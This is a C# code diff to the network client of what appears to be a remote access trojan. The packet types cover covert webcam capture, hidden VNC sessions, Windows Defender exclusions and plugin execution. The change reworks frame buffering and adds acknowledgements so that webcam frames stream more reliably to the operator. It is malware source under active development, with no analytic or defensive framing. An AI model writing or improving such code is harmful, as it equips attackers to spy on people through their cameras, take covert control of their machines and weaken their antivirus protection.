@@ -32,7 +32,7 @@ internal class TlsClient : IDisposable
     private readonly System.Threading.Channels.Channel<Packet> _frameCh =
         System.Threading.Channels.Channel.CreateBounded<Packet>(
             new System.Threading.Channels.BoundedChannelOptions(2)
-            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true });
+            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropOldest, SingleReader = true });
 
     // ── Output channels (two-level write pipeline) ────────────────────────────
     // The WriteLoop serialises packets into byte[] and enqueues them to these
@@ -46,7 +46,7 @@ internal class TlsClient : IDisposable
     private readonly System.Threading.Channels.Channel<byte[]> _frameOutCh =
         System.Threading.Channels.Channel.CreateBounded<byte[]>(
             new System.Threading.Channels.BoundedChannelOptions(2)
-            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true, SingleWriter = true });
+            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropOldest, SingleReader = true, SingleWriter = true });
 
     private CancellationTokenSource? _sessionCts;
 
@@ -297,10 +297,13 @@ internal class TlsClient : IDisposable
                 case PacketType.WcamStart:
                     var wcamCfg = System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new();
                     _ = Task.Run(() => WebcamFeature.Start(wcamCfg,
-                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, CancellationToken.None, dropIfBusy: true)));
+                        async (t, d) => { if (!await WriteFrameAsync(new Packet { Type = (PacketType)t, Data = d }, ct)) WebcamFeature.SignalAck(); }));
                     break;
                 case PacketType.WcamStop:
                     _ = Task.Run(() => WebcamFeature.Stop());
+                    break;
+                case PacketType.WcamFrameAck:
+                    WebcamFeature.SignalAck();
                     break;
 
                 case PacketType.HvncStart:
@@ -1894,6 +1897,7 @@ internal enum PacketType
     WcamStop = 61,
     WcamFrame = 62,
     WcamDevices = 63,
+    WcamFrameAck = 64,
 
     DefenderExclude = 70,
     PluginExec = 71,
